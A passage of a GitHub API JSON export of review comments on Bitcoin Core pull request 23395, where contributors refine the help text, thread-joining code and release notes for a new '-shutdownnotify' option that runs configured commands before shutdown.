        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/742215098/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": null,
    "original_line": 182,
    "side": "RIGHT"
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/742216204",
    "pull_request_review_id": 796936198,
    "id": 742216204,
    "node_id": "PRRC_kwDOABII584sPVIM",
    "diff_hunk": "@@ -405,6 +417,7 @@ void SetupServerArgs(ArgsManager& argsman)\n     argsman.AddArg(\"-settings=<file>\", strprintf(\"Specify path to dynamic settings data file. Can be disabled with -nosettings. File is written at runtime and not meant to be edited by users (use %s instead for custom settings). Relative paths will be prefixed by datadir location. (default: %s)\", BITCOIN_CONF_FILENAME, BITCOIN_SETTINGS_FILENAME), ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);\n #if HAVE_SYSTEM\n     argsman.AddArg(\"-startupnotify=<cmd>\", \"Execute command on startup.\", ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);\n+    argsman.AddArg(\"-shutdownnotify=<cmd>\", \"Execute command on shutdown.\", ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);",
    "path": "src/init.cpp",
    "position": null,
    "original_position": 30,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "812910ec4022d8ae1e355e3cfaf7292a020fb74a",
    "user": {
      "login": "luke-jr",
      "id": 1095675,
      "node_id": "MDQ6VXNlcjEwOTU2NzU=",
      "avatar_url": "https://avatars.githubusercontent.com/u/1095675?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/luke-jr",
      "html_url": "https://github.com/luke-jr",
      "followers_url": "https://api.github.com/users/luke-jr/followers",
      "following_url": "https://api.github.com/users/luke-jr/following{/other_user}",
      "gists_url": "https://api.github.com/users/luke-jr/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/luke-jr/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/luke-jr/subscriptions",
      "organizations_url": "https://api.github.com/users/luke-jr/orgs",
      "repos_url": "https://api.github.com/users/luke-jr/repos",
      "events_url": "https://api.github.com/users/luke-jr/events{/privacy}",
      "received_events_url": "https://api.github.com/users/luke-jr/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "```suggestion\r\n    argsman.AddArg(\"-shutdownnotify=<cmd>\", \"Execute command immediately before beginning shutdown. The need for shutdown may be urgent, so be careful not to delay it long (if the command doesn't require interaction with the server, consider having it fork into the background).\", ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);\r\n```\r\n\r\nOr maybe something shorter?",
    "created_at": "2021-11-03T18:18:46Z",
    "updated_at": "2021-11-03T18:19:14Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r742216204",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "MEMBER",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/742216204"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r742216204"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/742216204/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": null,
    "original_line": 420,
    "side": "RIGHT"
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744108916",
    "pull_request_review_id": 799433960,
    "id": 744108916,
    "node_id": "PRRC_kwDOABII584sWjN0",
    "diff_hunk": "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The shutdownnotify option is used to specify a command to execute when Bitcoin\n+Core has finished with its shutdown sequence. (#23395)",
    "path": "doc/release-notes.md",
    "position": null,
    "original_position": 5,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "812910ec4022d8ae1e355e3cfaf7292a020fb74a",
    "user": {
      "login": "klementtan",
      "id": 49265907,
      "node_id": "MDQ6VXNlcjQ5MjY1OTA3",
      "avatar_url": "https://avatars.githubusercontent.com/u/49265907?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/klementtan",
      "html_url": "https://github.com/klementtan",
      "followers_url": "https://api.github.com/users/klementtan/followers",
      "following_url": "https://api.github.com/users/klementtan/following{/other_user}",
      "gists_url": "https://api.github.com/users/klementtan/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/klementtan/subscriptions",
      "organizations_url": "https://api.github.com/users/klementtan/orgs",
      "repos_url": "https://api.github.com/users/klementtan/repos",
      "events_url": "https://api.github.com/users/klementtan/events{/privacy}",
      "received_events_url": "https://api.github.com/users/klementtan/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "Done \ud83d\udc4d\ud83c\udffb ",
    "created_at": "2021-11-06T10:21:34Z",
    "updated_at": "2021-11-06T10:21:35Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744108916",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "CONTRIBUTOR",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744108916"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744108916"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744108916/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": null,
    "original_line": 87,
    "side": "RIGHT",
    "in_reply_to_id": 742214334
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744109218",
    "pull_request_review_id": 799434141,
    "id": 744109218,
    "node_id": "PRRC_kwDOABII584sWjSi",
    "diff_hunk": "@@ -174,13 +174,25 @@ void Interrupt(NodeContext& node)\n     }\n }\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        std::thread t(runCommand, cmd);\n+        t.join(); // thread runs free",
    "path": "src/init.cpp",
    "position": null,
    "original_position": 9,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "812910ec4022d8ae1e355e3cfaf7292a020fb74a",
    "user": {
      "login": "klementtan",
      "id": 49265907,
      "node_id": "MDQ6VXNlcjQ5MjY1OTA3",
      "avatar_url": "https://avatars.githubusercontent.com/u/49265907?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/klementtan",
      "html_url": "https://github.com/klementtan",
      "followers_url": "https://api.github.com/users/klementtan/followers",
      "following_url": "https://api.github.com/users/klementtan/following{/other_user}",
      "gists_url": "https://api.github.com/users/klementtan/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/klementtan/subscriptions",
      "organizations_url": "https://api.github.com/users/klementtan/orgs",
      "repos_url": "https://api.github.com/users/klementtan/repos",
      "events_url": "https://api.github.com/users/klementtan/events{/privacy}",
      "received_events_url": "https://api.github.com/users/klementtan/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "Agreed, updated to start all commands then join on all of them afterward",
    "created_at": "2021-11-06T10:23:56Z",
    "updated_at": "2021-11-06T10:24:07Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744109218",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "CONTRIBUTOR",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744109218"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744109218"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744109218/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": null,
    "original_line": 182,
    "side": "RIGHT",
    "in_reply_to_id": 742215098
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744109434",
    "pull_request_review_id": 799434285,
    "id": 744109434,
    "node_id": "PRRC_kwDOABII584sWjV6",
    "diff_hunk": "@@ -405,6 +417,7 @@ void SetupServerArgs(ArgsManager& argsman)\n     argsman.AddArg(\"-settings=<file>\", strprintf(\"Specify path to dynamic settings data file. Can be disabled with -nosettings. File is written at runtime and not meant to be edited by users (use %s instead for custom settings). Relative paths will be prefixed by datadir location. (default: %s)\", BITCOIN_CONF_FILENAME, BITCOIN_SETTINGS_FILENAME), ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);\n #if HAVE_SYSTEM\n     argsman.AddArg(\"-startupnotify=<cmd>\", \"Execute command on startup.\", ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);\n+    argsman.AddArg(\"-shutdownnotify=<cmd>\", \"Execute command on shutdown.\", ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);",
    "path": "src/init.cpp",
    "position": null,
    "original_position": 30,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "812910ec4022d8ae1e355e3cfaf7292a020fb74a",
    "user": {
      "login": "klementtan",
      "id": 49265907,
      "node_id": "MDQ6VXNlcjQ5MjY1OTA3",
      "avatar_url": "https://avatars.githubusercontent.com/u/49265907?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/klementtan",
      "html_url": "https://github.com/klementtan",
      "followers_url": "https://api.github.com/users/klementtan/followers",
      "following_url": "https://api.github.com/users/klementtan/following{/other_user}",
      "gists_url": "https://api.github.com/users/klementtan/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/klementtan/subscriptions",
      "organizations_url": "https://api.github.com/users/klementtan/orgs",
      "repos_url": "https://api.github.com/users/klementtan/repos",
      "events_url": "https://api.github.com/users/klementtan/events{/privacy}",
      "received_events_url": "https://api.github.com/users/klementtan/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "Thanks! Updated to use your wording instead \ud83d\udc4d\ud83c\udffb ",
    "created_at": "2021-11-06T10:26:39Z",
    "updated_at": "2021-11-06T10:26:39Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744109434",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "CONTRIBUTOR",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744109434"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744109434"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744109434/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": null,
    "original_line": 420,
    "side": "RIGHT",
    "in_reply_to_id": 742216204
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744293568",
    "pull_request_review_id": 799568018,
    "id": 744293568,
    "node_id": "PRRC_kwDOABII584sXQTA",
    "diff_hunk": "@@ -174,13 +174,27 @@ void Interrupt(NodeContext& node)\n     }\n }\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::vector<std::thread> threads;\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        threads.emplace_back(runCommand, cmd);\n+    }\n+    for (auto& t : threads)\n+        t.join();",
    "path": "src/init.cpp",
    "position": null,
    "original_position": 12,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "9de9d4a5fe15c44de25f1dba4b5318fd1d66b99f",
    "user": {
      "login": "theStack",
      "id": 91535,
      "node_id": "MDQ6VXNlcjkxNTM1",
      "avatar_url": "https://avatars.githubusercontent.com/u/91535?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/theStack",
      "html_url": "https://github.com/theStack",
      "followers_url": "https://api.github.com/users/theStack/followers",
      "following_url": "https://api.github.com/users/theStack/following{/other_user}",
      "gists_url": "https://api.github.com/users/theStack/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/theStack/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/theStack/subscriptions",
      "organizations_url": "https://api.github.com/users/theStack/orgs",
      "repos_url": "https://api.github.com/users/theStack/repos",
      "events_url": "https://api.github.com/users/theStack/events{/privacy}",
      "received_events_url": "https://api.github.com/users/theStack/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "nit: put in braces to match our coding guidelines (or alternatively, all on a single line)\r\n```suggestion\r\n    for (auto& t : threads) {\r\n        t.join();\r\n    }\r\n```",
    "created_at": "2021-11-07T17:55:08Z",
    "updated_at": "2021-11-07T18:15:14Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744293568",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "CONTRIBUTOR",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744293568"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744293568"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744293568/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": 184,
    "start_side": "RIGHT",
    "line": null,
    "original_line": 185,
    "side": "RIGHT"
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744295494",
    "pull_request_review_id": 799568018,
    "id": 744295494,
    "node_id": "PRRC_kwDOABII584sXQxG",
    "diff_hunk": "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The shutdownnotify option is used to specify a command to execute synchronously\n+when Bitcoin Core has begins its shutdown sequence. (#23395)",
    "path": "doc/release-notes.md",
    "position": null,
    "original_position": 5,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "2d8a11b9ad4ac224357f21077ed023203b2d98cd",
    "user": {
      "login": "theStack",
      "id": 91535,
      "node_id": "MDQ6VXNlcjkxNTM1",
      "avatar_url": "https://avatars.githubusercontent.com/u/91535?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/theStack",
      "html_url": "https://github.com/theStack",
      "followers_url": "https://api.github.com/users/theStack/followers",
      "following_url": "https://api.github.com/users/theStack/following{/other_user}",
      "gists_url": "https://api.github.com/users/theStack/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/theStack/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/theStack/subscriptions",
      "organizations_url": "https://api.github.com/users/theStack/orgs",
      "repos_url": "https://api.github.com/users/theStack/repos",
      "events_url": "https://api.github.com/users/theStack/events{/privacy}",
      "received_events_url": "https://api.github.com/users/theStack/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "```suggestion\r\n- The `shutdownnotify` option is used to specify a command to execute synchronously\r\n  before Bitcoin Core begins its shutdown sequence. (#23395)\r\n```",
    "created_at": "2021-11-07T18:11:10Z",
    "updated_at": "2021-11-07T18:15:14Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744295494",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "CONTRIBUTOR",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744295494"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744295494"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744295494/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": 86,
    "start_side": "RIGHT",
    "line": null,
    "original_line": 87,
    "side": "RIGHT"
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744338502",
    "pull_request_review_id": 799604209,
    "id": 744338502,
    "node_id": "PRRC_kwDOABII584sXbRG",
    "diff_hunk": "@@ -174,13 +174,27 @@ void Interrupt(NodeContext& node)\n     }\n }\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::vector<std::thread> threads;\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        threads.emplace_back(runCommand, cmd);\n+    }\n+    for (auto& t : threads)\n+        t.join();",
    "path": "src/init.cpp",
    "position": null,
    "original_position": 12,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "9de9d4a5fe15c44de25f1dba4b5318fd1d66b99f",
    "user": {
      "login": "klementtan",
      "id": 49265907,
      "node_id": "MDQ6VXNlcjQ5MjY1OTA3",
      "avatar_url": "https://avatars.githubusercontent.com/u/49265907?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/klementtan",
      "html_url": "https://github.com/klementtan",
      "followers_url": "https://api.github.com/users/klementtan/followers",
      "following_url": "https://api.github.com/users/klementtan/following{/other_user}",
      "gists_url": "https://api.github.com/users/klementtan/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/klementtan/subscriptions",
      "organizations_url": "https://api.github.com/users/klementtan/orgs",
      "repos_url": "https://api.github.com/users/klementtan/repos",
      "events_url": "https://api.github.com/users/klementtan/events{/privacy}",
      "received_events_url": "https://api.github.com/users/klementtan/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "Done \ud83d\udc4d\ud83c\udffb ",
    "created_at": "2021-11-08T00:03:51Z",
    "updated_at": "2021-11-08T00:03:51Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744338502",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "CONTRIBUTOR",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744338502"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744338502"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744338502/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": 184,
    "start_side": "RIGHT",
    "line": null,
    "original_line": 185,
    "side": "RIGHT",
    "in_reply_to_id": 744293568
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744338532",
    "pull_request_review_id": 799604238,
    "id": 744338532,
    "node_id": "PRRC_kwDOABII584sXbRk",
    "diff_hunk": "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The shutdownnotify option is used to specify a command to execute synchronously\n+when Bitcoin Core has begins its shutdown sequence. (#23395)",
    "path": "doc/release-notes.md",
    "position": null,
    "original_position": 5,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "2d8a11b9ad4ac224357f21077ed023203b2d98cd",
    "user": {
      "login": "klementtan",
      "id": 49265907,
      "node_id": "MDQ6VXNlcjQ5MjY1OTA3",
      "avatar_url": "https://avatars.githubusercontent.com/u/49265907?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/klementtan",
      "html_url": "https://github.com/klementtan",
      "followers_url": "https://api.github.com/users/klementtan/followers",
      "following_url": "https://api.github.com/users/klementtan/following{/other_user}",
      "gists_url": "https://api.github.com/users/klementtan/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/klementtan/subscriptions",
      "organizations_url": "https://api.github.com/users/klementtan/orgs",
      "repos_url": "https://api.github.com/users/klementtan/repos",
      "events_url": "https://api.github.com/users/klementtan/events{/privacy}",
      "received_events_url": "https://api.github.com/users/klementtan/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "Done \ud83d\udc4d\ud83c\udffb ",
    "created_at": "2021-11-08T00:04:03Z",
    "updated_at": "2021-11-08T00:04:03Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744338532",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "CONTRIBUTOR",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744338532"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744338532"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744338532/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": 86,
    "start_side": "RIGHT",
    "line": null,
    "original_line": 87,
    "side": "RIGHT",
    "in_reply_to_id": 744295494
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747319588",
    "pull_request_review_id": 803558840,
    "id": 747319588,
    "node_id": "PRRC_kwDOABII584sizEk",
    "diff_hunk": "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The `shutdownnotify` option is used to specify a command to execute synchronously\n+before Bitcoin Core has begun its shutdown sequence. (#23395)\n+",
    "path": "doc/release-notes.md",
    "position": 6,
    "original_position": 6,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "user": {
      "login": "prayank23",
      "id": 13405205,
      "node_id": "MDQ6VXNlcjEzNDA1MjA1",
      "avatar_url": "https://avatars.githubusercontent.com/u/13405205?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/prayank23",
      "html_url": "https://github.com/prayank23",
      "followers_url": "https://api.github.com/users/prayank23/followers",
      "following_url": "https://api.github.com/users/prayank23/following{/other_user}",
      "gists_url": "https://api.github.com/users/prayank23/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/prayank23/subscriptions",
      "organizations_url": "https://api.github.com/users/prayank23/orgs",
      "repos_url": "https://api.github.com/users/prayank23/repos",
      "events_url": "https://api.github.com/users/prayank23/events{/privacy}",
      "received_events_url": "https://api.github.com/users/prayank23/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "```suggestion\r\n\r\nNote: Restrict scripts and commands in the shell/system used for bitcoind to avoid running potentially unsafe scripts using `shutdownnotify`\r\n\r\n```\r\n\r\nContext: https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956356904\r\nMore info: https://github.com/bitcoin/bitcoin/issues/23412",
    "created_at": "2021-11-11T09:04:10Z",
    "updated_at": "2021-11-11T09:04:10Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747319588",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "CONTRIBUTOR",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747319588"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747319588"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747319588/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": 88,
    "original_line": 88,
    "side": "RIGHT"
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747321697",
    "pull_request_review_id": 803561799,
    "id": 747321697,
    "node_id": "PRRC_kwDOABII584sizlh",
    "diff_hunk": "@@ -155,8 +155,24 @@ static fs::path GetPidFile(const ArgsManager& args)\n // shutdown thing.\n //\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::vector<std::thread> threads;\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        threads.emplace_back(runCommand, cmd);",
    "path": "src/init.cpp",
    "position": 9,
    "original_position": 9,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "46790135b949e9f7aae3af02ba9e63b7c3bcac62",
    "user": {
      "login": "prayank23",
      "id": 13405205,
      "node_id": "MDQ6VXNlcjEzNDA1MjA1",
      "avatar_url": "https://avatars.githubusercontent.com/u/13405205?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/prayank23",
      "html_url": "https://github.com/prayank23",
      "followers_url": "https://api.github.com/users/prayank23/followers",
      "following_url": "https://api.github.com/users/prayank23/following{/other_user}",
      "gists_url": "https://api.github.com/users/prayank23/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/prayank23/subscriptions",
      "organizations_url": "https://api.github.com/users/prayank23/orgs",
      "repos_url": "https://api.github.com/users/prayank23/repos",
      "events_url": "https://api.github.com/users/prayank23/events{/privacy}",
      "received_events_url": "https://api.github.com/users/prayank23/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "Is it possible to Restrict `runCommand` so that it will use only local resources and network?",
    "created_at": "2021-11-11T09:07:14Z",
    "updated_at": "2021-11-11T09:07:14Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747321697",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "CONTRIBUTOR",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747321697"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747321697"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747321697/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": 163,
    "original_line": 163,
    "side": "RIGHT"
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747465714",
    "pull_request_review_id": 803751647,
    "id": 747465714,
    "node_id": "PRRC_kwDOABII584sjWvy",
    "diff_hunk": "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The `shutdownnotify` option is used to specify a command to execute synchronously\n+before Bitcoin Core has begun its shutdown sequence. (#23395)\n+",
    "path": "doc/release-notes.md",
    "position": 6,
    "original_position": 6,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "user": {
      "login": "klementtan",
      "id": 49265907,
      "node_id": "MDQ6VXNlcjQ5MjY1OTA3",
      "avatar_url": "https://avatars.githubusercontent.com/u/49265907?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/klementtan",
      "html_url": "https://github.com/klementtan",
      "followers_url": "https://api.github.com/users/klementtan/followers",
      "following_url": "https://api.github.com/users/klementtan/following{/other_user}",
      "gists_url": "https://api.github.com/users/klementtan/gists{/gist_id}",
